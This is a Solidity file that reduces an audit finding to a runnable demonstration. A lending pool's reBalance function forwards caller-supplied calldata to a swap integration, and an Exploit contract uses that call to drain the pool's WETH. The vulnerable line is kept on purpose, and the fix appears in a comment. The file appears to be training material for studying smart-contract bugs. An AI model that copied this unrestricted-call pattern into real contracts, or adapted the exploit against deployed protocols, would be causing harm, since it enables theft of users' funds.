// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Liquorice — LendingPool.reBalance makes an arbitrary call (MixBytes, finding 49434).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: reBalance forwards caller-supplied _swapData to UniswapIntegration.
    quoteExactInput returns 0, abi.decode accepts that 0, and the tokens already sent
    to the integration stay there. swap() then pulls them to the attacker.
    Vulnerable line preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UniswapIntegration {
    function quoteExactInput(address, address, uint256, address) external pure returns (uint256) {
        return 0;
    }

    function swap(address token, address recipient, uint256 amount) external {
        Token(token).transfer(recipient, amount);
    }
}

contract LendingPool {
    Token public weth;
    UniswapIntegration public uni;
    uint256 public decodedOut;

    constructor(Token weth_, UniswapIntegration uni_) {
        weth = weth_;
        uni = uni_;
    }

    function reBalance(
        address tokenIn,
        address,
        address,
        uint256 amount,
        bool,
        bytes calldata _swapData
    ) external {
        weth.transfer(address(uni), amount);
        (bool ok, bytes memory result) = address(uni).call(_swapData); // @> VULN: _swapData can call any UniswapIntegration function, not only swap()
        // FIX: (bool ok, bytes memory result) = address(uni).call(abi.encodeWithSelector(uni.swap.selector, tokenIn, address(this), amount));
        require(ok, "call");
        decodedOut = abi.decode(result, (uint256));
        tokenIn;
    }
}

contract Exploit {
    Token public weth; // nonce 1
    UniswapIntegration public uni; // nonce 2
    LendingPool public pool; // nonce 3
    uint256 public profit;

    constructor() {
        weth = new Token("WETH");
        uni = new UniswapIntegration();
        pool = new LendingPool(weth, uni);
    }

    function run() external {
        uint256 supplyAmount = 5 ether;
        weth.mint(address(pool), supplyAmount);
        bytes memory data = abi.encodeWithSelector(uni.quoteExactInput.selector, address(weth), address(weth), 1, address(0));
        pool.reBalance(address(weth), address(weth), address(this), supplyAmount, false, data);
        uni.swap(address(weth), address(this), supplyAmount);
        uint256 got = weth.balanceOf(address(this));
        weth.transfer(msg.sender, got);
        profit = weth.balanceOf(msg.sender);
        require(pool.decodedOut() == 0, "quote was not decoded as 0");
        require(profit == supplyAmount, "weth not stolen");
        require(weth.balanceOf(address(pool)) == 0, "pool still holds weth");
        require(weth.balanceOf(address(uni)) == 0, "integration still holds weth");
    }
}
